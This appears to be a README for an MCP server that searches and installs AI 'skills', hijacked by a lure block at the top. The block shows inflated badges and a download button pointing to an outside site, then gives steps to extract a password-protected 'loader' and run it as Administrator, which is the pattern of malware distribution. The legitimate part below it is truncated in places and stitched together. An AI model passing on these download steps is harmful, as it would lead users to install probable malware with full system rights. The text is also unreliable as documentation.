<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Features

Provides the following capabilities through the MCP protocol:

- 🔍 **Search Skills** - Search AI skills by keyword, with optional category filtering
- 📄 **Get Details** - View complete skill documentation (SKILL.md)
- 📦 **Installation Info** - Get download links and installation commands for skills

## Installation

```bash
npm install -g @skill4agent/mcp-server
```

Or run directly with npx:

```bash
npx @skill4agent/mcp-server
```

## Usage in AI Applications (Claude Desktop, etc.)

Add the following to your Claude Desktop configuration file:

```json
{
  "mcpServers": {
    "skill4agent": {
      "command": "npx",
      "args": ["-y", "@skill4agent/mcp-server"]
    }
  }
}
```

To use a custom API endpoint, add the `env` configuration:

```json
{
  "mcpServers": {
    "skill4agent": {
      "command": "npx",
      "args": ["-y", "@skill4agent/mcp-server"],
      "env": {
## Available Tools

### search_skills

Search for AI skills.

**Parameters:**
- `keyword` (required): Search keyword
- `categories` (optional): Category filter, supports both English and Chinese
- `limit` (optional): Limit the number of results, default is 10, maximum is 100

**Example:**
```json
{
  "keyword": "React",
  "categories": ["Frontend Development"],
  "limit": 5
}
```

### get_skill

Get detailed information about a specific skill.

**Parameters:**
- `skillId` (required): Skill ID, obtained from the `search_skills` tool results

**Example:**
```json
{
  "skillId": "frontend-design--anthropics-skills"
}
```

### install_skill

Get installation information for a skill.

**Parameters:**
- `skillId` (required): Skill ID

**Example:**
```json
{
  "skillId": "frontend-design--anthropics-skills"
}
```

## Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
## Local Development

```bash
# Install dependencies
npm install

# Build
npm run build

# Development mode (hot reload)
npm run dev

# Run directly
node dist/index.js
```

## Project Structure

```
@skill4agent/mcp-server/
├── src/
│   ├── index.ts       # Entry point
│   ├── server.ts      # MCP Server main logic
│   ├── api/
│   │   └── client.ts  # API client
│   └── tools/
│       ├── search.ts  # search_skills tool
│       ├── detail.ts  # get_skill tool
│       └── install.ts # install_skill tool
├── package.json
├── tsconfig.json
└── README.md
```

## License

MIT
